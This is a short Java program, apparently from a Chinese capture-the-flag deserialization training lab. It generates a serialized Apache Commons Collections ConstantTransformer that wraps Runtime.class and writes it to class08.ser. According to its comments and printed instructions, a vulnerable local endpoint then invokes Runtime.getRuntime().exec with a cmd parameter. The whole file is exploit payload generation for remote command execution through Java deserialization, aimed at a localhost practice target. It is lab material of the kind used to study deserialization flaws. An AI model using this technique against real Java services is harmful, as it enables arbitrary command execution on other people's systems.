package class08;

import org.apache.commons.collections.functors.ConstantTransformer;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import com.ctfstu.common.Logger;

/**
 * 生成 class08 的 payload — ConstantTransformer
 * 目标: 上传 ConstantTransformer(Runtime.class)，
 *       靶场 transform() 返回 Runtime.class 后反射调用 getRuntime().exec(cmd)
 * 靶场: /class08/upload?cmd=id
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        Logger.setLogLevel(Logger.DEBUG);
        // ConstantTransformer: 固定返回 Runtime.class
        ConstantTransformer ct = new ConstantTransformer(Runtime.class);

        ObjectOutputStream oos = new ObjectOutputStream(
                new FileOutputStream("class08.ser"));
        oos.writeObject(ct);
        oos.close();

        System.out.println("✅ 已生成: class08.ser");
        System.out.println("访问: http://localhost:81/class08/?cmd=id 加上 ?cmd 参数");
    }
}
